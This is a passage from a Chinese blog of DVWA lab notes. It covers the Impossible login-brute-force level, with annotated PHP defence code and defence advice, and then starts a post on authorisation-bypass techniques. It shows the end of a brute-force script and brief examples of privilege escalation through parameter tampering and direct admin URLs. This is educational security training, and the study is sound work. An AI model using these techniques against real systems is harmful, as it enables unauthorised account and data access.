<span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 失败: <span class="subst">&#123;user&#125;</span> / <span class="subst">&#123;passwd&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>几乎无法攻破的完善防护。</p>
<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 改进1：使用POST方法并验证所有参数 ★★★</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在</span></span><br><span class="line"><span class="comment">// 同时检查Login、username、password三个参数</span></span><br><span class="line"><span class="comment">// 使用$_POST而不是$_GET，密码不会出现在URL中</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ CSRF Token验证 ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并处理用户名</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$user</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取并处理密码</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))</span><br><span class="line">        ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass</span> )</span><br><span class="line">        : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call!&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：账户锁定机制 - 配置参数 ★★★</span></span><br><span class="line">    <span class="comment">// 定义锁定相关常量</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;    <span class="comment">// 最大失败次数：3次</span></span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;   <span class="comment">// 锁定时间：15分钟</span></span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>; <span class="comment">// 账户锁定状态标志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进3：使用PDO预编译语句 ★★★</span></span><br><span class="line">    <span class="comment">// $db - PDO数据库连接对象</span></span><br><span class="line">    <span class="comment">// prepare() - 准备一个SQL语句用于执行</span></span><br><span class="line">    <span class="comment">// :user - 命名参数占位符</span></span><br><span class="line">    <span class="comment">// LIMIT 1 - 限制只返回一行结果</span></span><br><span class="line">    <span class="comment">// 作用：查询该用户的失败登录次数和最后登录时间</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// bindParam() - 绑定参数到预编译语句</span></span><br><span class="line">    <span class="comment">// 参数1：占位符名称</span></span><br><span class="line">    <span class="comment">// 参数2：要绑定的变量</span></span><br><span class="line">    <span class="comment">// 参数3：参数数据类型（PDO::PARAM_STR表示字符串）</span></span><br><span class="line">    <span class="comment">// 作用：完全防止SQL注入，SQL和数据完全分离</span></span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// execute() - 执行预编译语句</span></span><br><span class="line">    <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fetch() - 获取结果集的下一行</span></span><br><span class="line">    <span class="comment">// 返回关联数组，键名为列名</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进4：检查账户是否被锁定 ★★★</span></span><br><span class="line">    <span class="comment">// rowCount() - 返回受影响的行数</span></span><br><span class="line">    <span class="comment">// $row[ &#x27;failed_login&#x27; ] - 失败登录次数</span></span><br><span class="line">    <span class="comment">// 如果用户存在且失败次数&gt;=3次，检查是否在锁定期内</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算时间</span></span><br><span class="line">        <span class="comment">// strtotime() - 将任何英文文本日期时间描述解析为Unix时间戳</span></span><br><span class="line">        <span class="comment">// $row[ &#x27;last_login&#x27; ] - 数据库中的最后登录时间（字符串格式）</span></span><br><span class="line">        <span class="variable">$last_login</span> = <span class="title function_ invoke__">strtotime</span>( <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 计算锁定结束时间</span></span><br><span class="line">        <span class="comment">// $lockout_time * 60 - 将分钟转换为秒</span></span><br><span class="line">        <span class="variable">$timeout</span>    = <span class="variable">$last_login</span> + (<span class="variable">$lockout_time</span> * <span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// time() - 返回当前Unix时间戳</span></span><br><span class="line">        <span class="variable">$timenow</span>    = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否仍在锁定期内</span></span><br><span class="line">        <span class="comment">// 如果当前时间 &lt; 锁定结束时间，说明仍被锁定</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &lt; <span class="variable">$timeout</span> ) &#123;</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// 不输出任何信息（安全实践：不透露账户状态）</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进5：只有账户未锁定时才验证登录 ★★★</span></span><br><span class="line">    <span class="comment">// ! - 逻辑非运算符</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$account_locked</span> ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用PDO预编译语句验证用户名和密码</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 验证登录</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">rowCount</span>() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// ★★★ 登录成功：重置失败计数器 ★★★</span></span><br><span class="line">            <span class="comment">// UPDATE - SQL更新语句</span></span><br><span class="line">            <span class="comment">// SET failed_login = &quot;0&quot; - 将失败次数重置为0</span></span><br><span class="line">            <span class="comment">// 作用：成功登录后清除失败记录，防止误锁定</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取并显示用户信息</span></span><br><span class="line">            <span class="variable">$avatar</span> = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ★★★ 登录失败处理 ★★★</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 随机延迟2-4秒</span></span><br><span class="line">            <span class="comment">// rand( 2, 4 ) - 生成2到4之间的随机整数</span></span><br><span class="line">            <span class="comment">// 作用：减慢暴力破解，增加不确定性</span></span><br><span class="line">            <span class="title function_ invoke__">sleep</span>( <span class="title function_ invoke__">rand</span>( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出失败信息（提示可能是锁定原因）</span></span><br><span class="line">            <span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ★★★ 改进6：增加失败计数 ★★★</span></span><br><span class="line">            <span class="comment">// failed_login = (failed_login + 1) - 失败次数+1</span></span><br><span class="line">            <span class="comment">// 每次失败都会累加，达到3次后触发锁定</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 改进7：更新最后登录时间 ★★★</span></span><br><span class="line">        <span class="comment">// now() - MySQL函数，返回当前日期和时间</span></span><br><span class="line">        <span class="comment">// 无论成功失败都更新，用于锁定时间计算</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::<span class="variable constant_">PARAM_STR</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF Token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><ol>
<li><strong>POST请求</strong> - 密码不出现在URL</li>
<li><strong>PDO预编译</strong> - 完全防止SQL注入</li>
<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>账户锁定</strong> - 3次失败锁定15分钟</li>
<li><strong>失败计数</strong> - 记录每个账户的失败次数</li>
<li><strong>成功重置</strong> - 成功登录清零计数器</li>
<li><strong>时间更新</strong> - 记录每次尝试时间</li>
<li><strong>随机延迟</strong> - 2-4秒不可预测</li>
</ol>
<h3 id="为什么几乎无法攻破？"><a href="#为什么几乎无法攻破？" class="headerlink" title="为什么几乎无法攻破？"></a>为什么几乎无法攻破？</h3><p><strong>攻击成本计算：</strong></p>
<p>假设密码字典有1000个密码：</p>
<ul>
<li>每3次尝试需要等待15分钟</li>
<li>1000密码 ÷ 3 &#x3D; 334轮</li>
<li>334轮 × 15分钟 &#x3D; 5010分钟 ≈ <strong>83.5小时</strong></li>
<li>加上每次2-4秒延迟：1000次 × 3秒 ≈ 50分钟</li>
<li><strong>总计：约84小时（3.5天）</strong></li>
</ul>
<p>这还只是一个用户名！</p>
<p><strong>防御层级：</strong></p>
<ol>
<li>PDO预编译 → SQL注入无效</li>
<li>CSRF Token → 自动化工具需要额外处理</li>
<li>账户锁定 → 暴力破解效率极低</li>
<li>POST请求 → URL不泄露密码</li>
<li>随机延迟 → 增加时间成本</li>
</ol>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><ol>
<li><strong>使用POST请求</strong> - 敏感数据不应出现在URL</li>
<li><strong>PDO预编译语句</strong> - 彻底防止SQL注入</li>
<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>密码哈希</strong> - 使用bcrypt、Argon2，不要用MD5</li>
<li><strong>输入验证</strong> - 严格验证所有输入</li>
</ol>
<h3 id="机制层面"><a href="#机制层面" class="headerlink" title="机制层面"></a>机制层面</h3><ol>
<li><p><strong>账户锁定</strong></p>
<ul>
<li>5次失败锁定30分钟</li>
<li>或使用指数退避（1分钟→5分钟→30分钟）</li>
</ul>
</li>
<li><p><strong>验证码</strong></p>
<ul>
<li>3次失败后显示验证码</li>
<li>使用reCAPTCHA v3</li>
</ul>
</li>
<li><p><strong>多因素认证(MFA)</strong></p>
<ul>
<li>短信验证码</li>
<li>TOTP（Google Authenticator）</li>
<li>硬件密钥</li>
</ul>
</li>
<li><p><strong>限流</strong></p>
<ul>
<li>IP限流：每IP每分钟10次请求</li>
<li>账户限流：每账户每分钟3次尝试</li>
</ul>
</li>
</ol>
<h3 id="监控层面"><a href="#监控层面" class="headerlink" title="监控层面"></a>监控层面</h3><ol>
<li><p><strong>日志记录</strong></p>
<ul>
<li>记录所有登录尝试</li>
<li>包括IP、时间、用户名</li>
</ul>
</li>
<li><p><strong>异常检测</strong></p>
<ul>
<li>监控失败登录高峰</li>
<li>检测分布式攻击</li>
</ul>
</li>
<li><p><strong>告警机制</strong></p>
<ul>
<li>多次失败触发告警</li>
<li>异常IP自动封禁</li>
</ul>
</li>
</ol>
<h3 id="Web应用防火墙-WAF"><a href="#Web应用防火墙-WAF" class="headerlink" title="Web应用防火墙(WAF)"></a>Web应用防火墙(WAF)</h3><ol>
<li>Cloudflare</li>
<li>AWS WAF</li>
<li>ModSecurity</li>
</ol>
<hr>
<h2 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h2><table>
<thead>
<tr>
<th>特性</th>
<th>Low</th>
<th>Medium</th>
<th>High</th>
<th>Impossible</th>
</tr>
</thead>
<tbody><tr>
<td>请求方法</td>
<td>GET</td>
<td>GET</td>
<td>GET</td>
<td>POST</td>
</tr>
<tr>
<td>SQL注入防护</td>
<td>❌</td>
<td>✅ mysqli_escape</td>
<td>✅ mysqli_escape</td>
<td>✅ PDO预编译</td>
</tr>
<tr>
<td>CSRF防护</td>
<td>❌</td>
<td>❌</td>
<td>✅ Token</td>
<td>✅ Token</td>
</tr>
<tr>
<td>登录延迟</td>
<td>❌</td>
<td>✅ 2秒固定</td>
<td>✅ 0-3秒随机</td>
<td>✅ 2-4秒随机</td>
</tr>
<tr>
<td>账户锁定</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅ 3次&#x2F;15分钟</td>
</tr>
<tr>
<td>失败计数</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>极难</td>
</tr>
<tr>
<td>预计破解时间</td>
<td>&lt;1分钟</td>
<td>30分钟</td>
<td>数小时</td>
<td>数天</td>
</tr>
</tbody></table>
<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><ol>
<li><strong>从Low开始</strong> - 熟悉基本操作</li>
<li><strong>理解Medium</strong> - 学习基础防护</li>
<li><strong>挑战High</strong> - 掌握Token绕过</li>
<li><strong>研究Impossible</strong> - 理解完善的防护体系</li>
</ol>
<p><strong>学习路径：</strong></p>
<ul>
<li>手动测试 → Burp Suite → 脚本自动化 → 分析防护机制</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不攻击真实系统</li>
<li>学习目的是防御，不是攻击</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/Authorisation_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/Authorisation_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - Authorisation Bypass (权限绕过) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:23:17" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>24k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>21 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是权限绕过（Authorisation-Bypass）？"><a href="#什么是权限绕过（Authorisation-Bypass）？" class="headerlink" title="什么是权限绕过（Authorisation Bypass）？"></a>什么是权限绕过（Authorisation Bypass）？</h3><p>权限绕过也称为访问控制漏洞，指攻击者能够访问或执行他们不应该有权限的功能或资源，绕过应用程序的授权检查。</p>
<p><strong>认证 vs 授权：</strong></p>
<table>
<thead>
<tr>
<th>概念</th>
<th>英文</th>
<th>作用</th>
<th>问题</th>
</tr>
</thead>
<tbody><tr>
<td>认证</td>
<td>Authentication</td>
<td>验证用户身份（你是谁？）</td>
<td>弱密码、会话劫持</td>
</tr>
<tr>
<td>授权</td>
<td>Authorisation</td>
<td>验证用户权限（你能做什么？）</td>
<td>权限绕过、越权访问</td>
</tr>
</tbody></table>
<p><strong>权限绕过的类型：</strong></p>
<h3 id="1-水平权限绕过（Horizontal-Privilege-Escalation）"><a href="#1-水平权限绕过（Horizontal-Privilege-Escalation）" class="headerlink" title="1. 水平权限绕过（Horizontal Privilege Escalation）"></a>1. 水平权限绕过（Horizontal Privilege Escalation）</h3><p>用户访问同级别其他用户的资源：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户A → 只能访问自己的订单</span><br><span class="line">攻击：修改<span class="attribute">order_id</span>=123 → <span class="attribute">order_id</span>=456</span><br><span class="line">结果：访问到用户B的订单</span><br></pre></td></tr></table></figure>

<h3 id="2-垂直权限绕过（Vertical-Privilege-Escalation）"><a href="#2-垂直权限绕过（Vertical-Privilege-Escalation）" class="headerlink" title="2. 垂直权限绕过（Vertical Privilege Escalation）"></a>2. 垂直权限绕过（Vertical Privilege Escalation）</h3><p>普通用户获取更高权限（如管理员）：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通用户 → 访问<span class="regexp">/admin/</span>panel</span><br><span class="line">结果：获得管理员功能</span><br></pre></td></tr></table></figure>

<h3 id="3-功能级权限绕过"><a href="#3-功能级权限绕过" class="headerlink" title="3. 功能级权限绕过"></a>3. 功能级权限绕过</h3><p>访问未授权的功能或API：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通用户 → POST <span class="regexp">/api/</span>admin/delete_user</span><br><span class="line">结果：执行管理员操作</span><br></pre></td></tr></table></figure>

<p><strong>危害：</strong></p>
<ul>
<li>访问他人敏感数据</li>
<li>修改其他用户信息</li>
<li>执行管理员操作</li>
<li>删除重要数据</li>
<li>完全控制系统</li>
</ul>
<p><strong>常见原因：</strong></p>
<ul>
<li>只在前端隐藏功能</li>
<li>依赖用户提供的参数判断权限</li>
<li>不检查资源所有权</li>
<li>Session中存储可篡改的权限信息</li>
<li>URL可预测的管理功能</li>
</ul>
<p><strong>DVWA场景：</strong><br>一个用户管理系统，有普通用户和管理员两种角色。</p>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全不检查用户权限，任何用户都可以访问管理功能。</p>
